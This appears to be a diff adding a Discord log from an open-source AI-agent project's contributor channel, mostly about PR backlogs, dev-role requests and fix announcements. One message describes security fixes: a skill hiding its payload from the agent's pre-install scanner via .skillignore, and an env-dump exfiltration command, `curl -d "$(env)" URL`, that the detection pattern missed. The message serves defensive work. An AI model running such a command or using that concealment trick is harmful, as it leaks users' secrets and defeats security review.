@@ -52289,3 +52289,198 @@ An under... https://www.linkedin.com/posts/sydney-runkle_deepagents-now-supports
     Is this amount not overwhelmed just by the pure amount of contributors, even with 1 PR?
     [reply to teknium msg=1531728399293481070]
 
+[2026-07-28T19:24:34.387000+00:00] .surly (id=1531744194446758040)
+    Am I supposed to promot my open PRs here.. not sure I am that social.
+
+[2026-07-28T19:33:30.841000+00:00] looned. (id=1531746444497649795)
+    As far as I understand, you just need to wait (for quite some time) for review bot to catch-up with yours PRs 
+    
+    https://discord.com/channels/1053877538025386074/1491258766648283238/1531722378072035419
+    [reply to .surly msg=1531744194446758040]
+
+[2026-07-28T19:34:05.776000+00:00] .surly (id=1531746591025926288)
+    great..
+
+[2026-07-28T19:41:08.039000+00:00] promptsiren (id=1531748362125050078)
+    rough data looks like
+    teknium is 12.3% of all PRs
+    and then excluding gille at the bottom there
+    the top 10 community contributers are responsible for 10.6% of PRs
+    722 authors (10.2% of open-PR authors) hold >3 open PRs — 7,585 PRs, 48.0% of the residual open backlog. Median open PRs per author is 1; mean 2.24; max 143.
+    
+    so there's a long tail
+    Single-open-PR authors are 69.5% of people but 31.1% of the backlog
+    [attachment] CleanShot_2026-07-28_at_15.32.412x.png https://cdn.discordapp.com/attachments/1491258766648283238/1531748361936310343/CleanShot_2026-07-28_at_15.32.412x.png?ex=6a6a5753&is=6a6905d3&hm=341064bf9c0ee231c73926d88c85c5b31a2410e803c4f7bf4be5004bf5579d00&
+    [attachment] CleanShot_2026-07-28_at_15.40.002x.png https://cdn.discordapp.com/attachments/1491258766648283238/1531748362259529799/CleanShot_2026-07-28_at_15.40.002x.png?ex=6a6a5754&is=6a6905d4&hm=0710317bef8ace91c4851f92eae9ec96ebc993036fa33de9cd4fc2e69b9ec9ea&
+
+[2026-07-28T19:51:04.582000+00:00] realadolan (id=1531750864207872020)
+    That's not enough, to be honest. I have some PRs that already got the "OK" from Teks sweeper but still haven't been merged
+    [reply to looned. msg=1531746444497649795]
+
+[2026-07-28T19:52:12.114000+00:00] looned. (id=1531751147457740840)
+    That's sounds reasonable. 
+    What is the next step for such PRs? I assume those have a tag, awaiting human review?
+    [reply to realadolan msg=1531750864207872020]
+
+[2026-07-28T19:52:25.401000+00:00] looned. (id=1531751203187327117)
+    Or is there another queue 🫠
+
+[2026-07-28T20:05:01.927000+00:00] maxfreedompollard (id=1531754376287486063)
+    <@387972437901312000> Give me merge power and I'll do it for you. <:catlick:1151260427645366375>
+
+[2026-07-28T20:08:06.632000+00:00] 0xatakan (id=1531755150996410538)
+    Small contribution update: three of my Hermes fixes were merged today 🎉
+    
+    - Desktop WebSocket token validation:
+      https://github.com/NousResearch/hermes-agent/pull/62718
+    
+    - Windows path-casing / gitignore handling:
+      https://github.com/NousResearch/hermes-agent/pull/67687
+    
+    - Windows attachment uploads to WSL2 and Linux backends:
+      https://github.com/NousResearch/hermes-agent/pull/71517
+    
+    Thanks <@387972437901312000>  for reviewing the backlog and helping move the CI process forward <:Prayge:1151275585000185968>  I’m now cleaning up the remaining branches against current main.
+
+[2026-07-28T20:18:35.122000+00:00] teknium (id=1531757787074400479)
+    🙂 welcome to dev status
+    [reply to 0xatakan msg=1531730048900534485]
+
+[2026-07-28T20:26:19.045000+00:00] 0xatakan (id=1531759732908495000)
+    Thank you! Really appreciate it 😊 Happy to be here, and I’m looking forward to contributing more.
+    [reply to teknium msg=1531757787074400479]
+
+[2026-07-28T21:11:24.047000+00:00] maxfreedompollard (id=1531771078509330653)
+    Could I please have dev status
+    [reply to teknium msg=1531757787074400479]
+
+[2026-07-28T21:15:47.523000+00:00] maxfreedompollard (id=1531772183607509143)
+    <@387972437901312000> I have 36 open PRs. I am in a similar situation as it comes to the maximum of 3 open PRs, especially as as I will always have 2 open PRs in the Hermes Agent Self Evolution Repository, due to my dedication to that repo and it's staged developmental requirements. I also bought a NOUS Research hat, so I feel special already. If I could get dev status or a similar solution, that would be amazing.
+    
+    https://github.com/pulls?q=is%3Apr+is%3Aopen+author%3A%40me+org%3ANousResearch
+
+[2026-07-28T21:16:02.091000+00:00] teknium (id=1531772244710264854)
+    You literally have it lol
+    [reply to maxfreedompollard msg=1531771078509330653]
+
+[2026-07-28T21:16:37.710000+00:00] maxfreedompollard (id=1531772394107174953)
+    Amazing! Thank you. 😍  🫶  ❤️
+    [reply to teknium msg=1531772244710264854]
+
+[2026-07-28T21:19:59.538000+00:00] godsboy7777 (id=1531773240635166864)
+    Hi <@387972437901312000>, could you or another Hermes Agent maintainer please review this refreshed PR when you have a chance?
+    
+    https://github.com/NousResearch/hermes-agent/pull/57090
+    
+    #73508 resolved the native Telegram voice-caption issue. I rebuilt #57090 on current main and narrowed it to the remaining non-duplicative work: MarkdownV2 captions for photos, documents, videos, animations, MP3/M4A audio and albums, plus bounded plain-caption fallback, private-topic reply fallback and UTF-16-safe caption limits.
+    
+    The PR is now clean and mergeable, with the full GitHub CI workflow passing. Thank you.
+
+[2026-07-28T21:32:57.045000+00:00] aleksandr_1 (id=1531776501736013877)
+    **1. fix(security): a skill cannot conceal its own threats from the scanner**
+    A skill could switch off its own pre-install scan with a `.skillignore` matching its payload; excluded findings are now recorded and weighed by the same install policy as visible ones. 
+    https://github.com/NousResearch/hermes-agent/pull/72920
+    
+    **2.  fix(security): treat an env dump in command substitution as a dump**
+    `curl -d "$(env)" URL` produced no findings because `dump_all_env` matches `env` only when a pipe follows it, while `printenv` matches on its own. https://github.com/NousResearch/hermes-agent/pull/73233
+
+[2026-07-28T21:34:39.738000+00:00] aleksandr_1 (id=1531776932461416600)
+    And thanks, Tek, for salvaging my fix from #47915 into #71676. 
+    **An honor**<:o7:1151261546111053924>
+    [attachment] IMAGE_2026-07-28_143344.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1531776932176334888/IMAGE_2026-07-28_143344.jpg?ex=6a6a71ef&is=6a69206f&hm=17b4ec9806c9683dc83b8c991cb1627fbb2df0b9b52e5bee0e2e40566067493f&
+
+[2026-07-28T21:42:42.331000+00:00] 2cb2 (id=1531778956603166810)
+    bump
+    [reply to teknium msg=1529474076471464098]
+
+[2026-07-28T21:44:07.818000+00:00] teknium (id=1531779315161763931)
+    Can you email security@nousresearch.com
+    [reply to 2cb2 msg=1531778956603166810]
+
+[2026-07-28T21:45:05.286000+00:00] 2cb2 (id=1531779556200157358)
+    i mean theyre already filed, I can but the reports are tehre
+    [reply to teknium msg=1531779315161763931]
+
+[2026-07-28T21:46:16.376000+00:00] teknium (id=1531779854372966500)
+    Then he will get to them if they’re security reports in GitHub
+    [reply to 2cb2 msg=1531779556200157358]
+
+[2026-07-28T21:49:54.280000+00:00] bkbeast88 (id=1531780768328716419)
+    <@387972437901312000> hi
+
+[2026-07-28T21:59:19.451000+00:00] gottz.de (id=1531783138827567145)
+    done: https://gottz.de/how-hermes-triage-works.html
+    ## there is a rough summary of how my triage works.
+    [reply to looned. msg=1531723298067451944]
+
+[2026-07-28T22:09:08.159000+00:00] looned. (id=1531785608047886506)
+    I am way too exhausted to even attempt at understanding this... I will look into it tomorrow 👀
+    [reply to gottz.de msg=1531783138827567145]
+
+[2026-07-28T22:09:59.544000+00:00] gottz.de (id=1531785823572328488)
+    just throw it in hermes and ask for a x of 10 rating and four short bullet points in what makes it interesting
+    [reply to looned. msg=1531785608047886506]
+
+[2026-07-28T22:11:24.256000+00:00] looned. (id=1531786178880208908)
+    seems like hermes likes you lmao
+    [attachment] image.png https://cdn.discordapp.com/attachments/1491258766648283238/1531786178901053581/image.png?ex=6a6a7a8c&is=6a69290c&hm=4f58faa144e4c5837791a2f9946708fbe05ecaa2f124bdb35739accb574bf828&
+
+[2026-07-28T22:12:12.859000+00:00] gottz.de (id=1531786382735970344)
+    ye. that "very information-dense" part will probably have the same effect on you as sleeping pills right now.
+    [reply to looned. msg=1531786178880208908]
+
+[2026-07-28T22:12:52.258000+00:00] looned. (id=1531786547987353802)
+    ye, idk where to look on that page tbh XD
+
+[2026-07-28T22:13:02.735000+00:00] gottz.de (id=1531786591931072812)
+    there is a "expand all" button <a:XDDDDDDDDDDDD:1009119058412707880>
+
+[2026-07-28T22:13:08.477000+00:00] looned. (id=1531786616014897284)
+    I just want to finish writing confluence doc and go to sleep 🙁
+
+[2026-07-28T22:13:18.888000+00:00] looned. (id=1531786659681800272)
+    [attachment] image.png https://cdn.discordapp.com/attachments/1491258766648283238/1531786659387932722/image.png?ex=6a6a7afe&is=6a69297e&hm=593c61cf172a03302fcdcb40fd1a2006ed66cbbd7b009528634fc0f3213f3cdf&
+
+[2026-07-28T22:13:23.978000+00:00] looned. (id=1531786681030807784)
+    🫠
+
+[2026-07-28T22:14:01.460000+00:00] gottz.de (id=1531786838241706134)
+    ask clanker to do it
+    [reply to looned. msg=1531786616014897284]
+
+[2026-07-28T22:14:16.649000+00:00] looned. (id=1531786901948727510)
+    some stuff you gotta handle on your own 🫡
+
+[2026-07-29T00:03:08.822000+00:00] linuztx. (id=1531814299868332195)
+    Building Alter Zero in Rust. Just a hobby project.
+    [attachment] image.png https://cdn.discordapp.com/attachments/1491258766648283238/1531814299511685451/image.png?ex=6a6a94bc&is=6a69433c&hm=dd600785327c8bc99b9db6892894bb684b7d131fda5b80e6bd65b95055b01167&
+
+[2026-07-29T01:11:07.803000+00:00] mariaosake (id=1531831408354398219)
+    I now have three merged commits in the repository. Would I be eligible for the DEV role  <:catlick:1151260427645366375> 
+    https://github.com/NousResearch/hermes-agent/commit/58f6678e6d01685be026fc05c1bb7eb6f58020bb
+    https://github.com/NousResearch/hermes-agent/commit/e51abb266dbea15f5756e7dac9fc8086c166de9e
+    https://github.com/NousResearch/hermes-agent/commit/431d2a628c8c03644749e4e5a6006f8b98d16a05
+    [reply to teknium msg=1531772244710264854]
+
+[2026-07-29T01:12:41.427000+00:00] teknium (id=1531831801042174034)
+    congrats
+    [reply to mariaosake msg=1531831408354398219]
+
+[2026-07-29T01:13:04.298000+00:00] mariaosake (id=1531831896969969807)
+    TThank you alot
+    [reply to teknium msg=1531831801042174034]
+
+[2026-07-29T01:53:17.932000+00:00] frowtek (id=1531842020484841614)
+    3 PRs up for review
+    
+    **#73707** https://github.com/NousResearch/hermes-agent/pull/73707
+    Kanban task workspace gets overridden by the profile's terminal.cwd → Docker mounts the whole profile dir rw instead of the task worktree. (fixes #73556, incl. the missing repro)
+    
+    **#73738** https://github.com/NousResearch/hermes-agent/pull/73738
+    A per-command workdir= permanently relocates the session's cwd. (fixes #73683)
+    
+    **#73751** https://github.com/NousResearch/hermes-agent/pull/73751
+    hermes update can hang forever on a git credential prompt — the update path was missed by #73709's sweep.
+    
+    Each ships a repro that fails on main.
+
